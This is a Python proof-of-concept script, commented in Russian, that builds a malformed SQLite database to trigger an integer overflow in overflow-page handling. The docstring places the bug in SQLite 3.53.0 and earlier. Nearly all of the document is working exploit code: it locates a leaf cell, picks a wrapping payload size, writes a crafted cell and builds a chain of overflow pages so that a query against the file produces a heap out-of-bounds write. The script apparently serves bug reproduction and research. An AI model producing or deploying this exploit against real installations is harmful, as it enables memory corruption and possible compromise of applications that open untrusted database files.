#!/usr/bin/env python3
"""craft_ovflcache.py v4 — nOvfl int-overflow PoC (sqlite ≤3.53.0, фикс 093e23814e).
Схема: t(a INTEGER PRIMARY KEY, b TEXT).
  row1: blob 25000 (local ~4000 → 1-ячеечный лист; создаёт aOverflow на курсоре)
  row2: blob 25000 → свой 1-ячеечный лист → перезаписываем crafted-ячейкой:
    P=0xFFFFFF00+b4 (varint FF FF FF FF b4 → декодер даёт 0xFFFFFF00+b4),
    nLocal = surplus-или-minLocal (формула sqlite), rec-hdr: a=NULL, b=огромный
    blob, +заглушка [80 00] (header не парсится до конца → guard обходится),
    ovfl-указатель на payload[nLocal] = наша цепь страниц.
  SELECT a,b (НЕ length! — BYTELENARG-shortcut не читает payload) →
  accessPayload: nOvfl=(P-nLocal+4091) wrap → 0 → realloc SKIP (aOverflow от
  row1 маленький) → walk пишет aOverflow[iIdx] за границу → HEAP OOB WRITE.
Usage: craft_ovflcache.py <out.db> [chain_pages]"""
import sqlite3, struct, sys, os

OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/ovflcache.db"
CHAIN = int(sys.argv[2]) if len(sys.argv) > 2 else 60
PAGE = 4096

def varint(n):
    out = b''
    while True:
        b7 = n & 0x7f; n >>= 7
        if n: out += bytes([b7|0x80])
        else: out += bytes([b7]); break
    return out

def create_base(path):
    for s in ('', '-journal', '-wal', '-shm'):
        if os.path.exists(path+s): os.unlink(path+s)
    con = sqlite3.connect(path)
    con.execute("PRAGMA page_size=4096")
    con.execute("PRAGMA journal_mode=OFF")
    con.execute("PRAGMA auto_vacuum=OFF")
    con.execute("CREATE TABLE t(a INTEGER PRIMARY KEY, b TEXT)")
    con.execute("INSERT INTO t VALUES(1, ?)", ("X" * 25000,))
    con.execute("INSERT INTO t VALUES(2, ?)", ("Y" * 25000,))
    con.commit()
    n = con.execute("PRAGMA page_count").fetchone()[0]
    root = con.execute("SELECT rootpage FROM sqlite_schema WHERE name='t'").fetchone()[0]
    con.close()
    return root, n

def leaf_cell_rowid(data, pg, ci):
    """разбор ячейки ci листа pg: (ptr, P, rowid) по inline-декодеру sqlite."""
    off = (pg-1)*PAGE
    ptr = struct.unpack_from('>H', data, off+8+2*ci)[0]
    t = data[off+ptr]; o = ptr
    if t >= 0x80:
        t &= 0x7f
        while data[off+o] >= 0x80:
            o += 1
            t = (t << 7) | (data[off+o] & 0x7f)
        t &= 0xffffffff
    o += 1
    # rowid varint (canonical reader)
    v = 0; shift = 0
    while True:
        c = data[off+o]; v |= (c & 0x7f) << shift; shift += 7; o += 1
        if not (c & 0x80): break
    return ptr, t, v

def main():
    root, npages = create_base(OUT)
    data = bytearray(open(OUT, 'rb').read())
    chain_start = npages + 1
    need = (chain_start + CHAIN) * PAGE
    if len(data) < need: data.extend(b'\x00' * (need - len(data)))
    struct.pack_into('>I', data, 28, chain_start + CHAIN - 1)

    # ищем лист с rowid=2 (1-ячеечный)
    leaf = ncells = r2ci = None
    for pg in range(2, npages+1):
        off = (pg-1)*PAGE
        if data[off + (100 if pg == 1 else 0)] != 0x0D: continue
        nc = struct.unpack_from('>H', data, off+3)[0]
        for ci in range(nc):
            ptr, P, rid = leaf_cell_rowid(data, pg, ci)
            if rid == 2:
                leaf, ncells, r2ci = pg, nc, ci
                break
        if leaf: break
    if not leaf:
        print("лист row2 не найден"); return 1
    print(f"root={root} npages={npages} row2: leaf={leaf} cellidx={r2ci} ncells={ncells}")

    minL = (PAGE - 12) * 32 // 255 - 23   # 489
    maxL = PAGE - 35                       # 4061
    def nlocal_sqlite(P):
        surplus = minL + (P - minL) % (PAGE - 4)
        return surplus if surplus <= maxL else minL
    # выбор P: nLocal такой, чтобы ячейка влезла в лист целиком:
    # NEW + 5(P) + 1(rowid) + hdr(6) + nLocal + 4 <= 4096
    P = nLocal = b4 = None
    # динамический лимит: crafted-ячейка кончается ДО row1 (клетки растут вниз)
    offL = (leaf-1)*PAGE
    row1_ptr = struct.unpack_from('>H', data, offL+8)[0]  # cell 0 = rowid 1
    NL_MAX = row1_ptr - 24
    print(f"row1_ptr={row1_ptr} → nLocal максимум = {NL_MAX}")
    P = nLocal = b4 = None
    for base_p, nff in ((0xFFFFFF00, 4), (0xFFFFFF80, 5)):
        for cand_b4 in range(0x7F, -1, -1):
            cand = base_p + cand_b4
            nl = nlocal_sqlite(cand)
            if nl + 16 <= NL_MAX:
                S = (cand - nl + PAGE - 5) % (2**32)
                if S < (PAGE - 4):
                    P, nLocal, b4 = cand, nl, (nff, cand_b4)
                    break
        if P: break
    if P is None: print("P не найден (окно не пересеклось)"); return 1
    pvarint = bytes([0xFF]*b4[0] + [b4[1]])
    print(f"P={P:#x} nLocal={nLocal} → nOvfl(int32)=0 ✓")

    # crafted ячейка
    hdr_body = b'\x00' + b'\xcd\x9a\x0c' + b'\x80\x00'   # a=0; b=сериал; pad
    rec_hdr = varint(len(hdr_body)) + hdr_body            # hdr_len=6
    payload_start = len(pvarint) + len(varint(2))
    cell = bytearray(pvarint + varint(2) + rec_hdr)
    cell = bytearray(bytes(cell).ljust(payload_start + nLocal + 4, b'A'))
    struct.pack_into('>I', cell, payload_start + nLocal, chain_start)

    # пишем в лист: row1 (cell 0) НЕ ТРОГАЕМ; row2 (cell 1) → crafted
    off = (leaf-1)*PAGE
    ptrs = [struct.unpack_from('>H', data, off+8+2*i)[0] for i in range(ncells)]
    r2ptr = ptrs[r2ci]
    NEW = row1_ptr - len(cell) - 8
    if NEW < 100: print("нет места под crafted"); return 1
    # затираем только СТАРУЮ row2-ячейку (от r2ptr до row1_ptr)
    data[off+r2ptr:off+row1_ptr] = b'\x00' * (row1_ptr - r2ptr)
    # crafted ниже row1
    data[off+NEW:off+NEW+len(cell)] = cell
    struct.pack_into('>H', data, off+8+2*r2ci, NEW)
    struct.pack_into('>H', data, off+5, NEW)   # content-start

    # ovfl-цепочка
    for i in range(CHAIN):
        pg = chain_start + i
        o = (pg-1)*PAGE
        nxt = pg+1 if i+1 < CHAIN else 0
        data[o:o+4] = struct.pack('>I', nxt)
        data[o+4:o+PAGE] = b'B' * (PAGE-4)

    open(OUT, 'wb').write(bytes(data))
    print(f"готово: {OUT} ({os.path.getsize(OUT)>>10} KB) leaf={leaf} P={P:#x} "
          f"nLocal={nLocal} cell@{NEW} chain={chain_start}+{CHAIN}")
    return 0

if __name__ == '__main__':
    sys.exit(main())
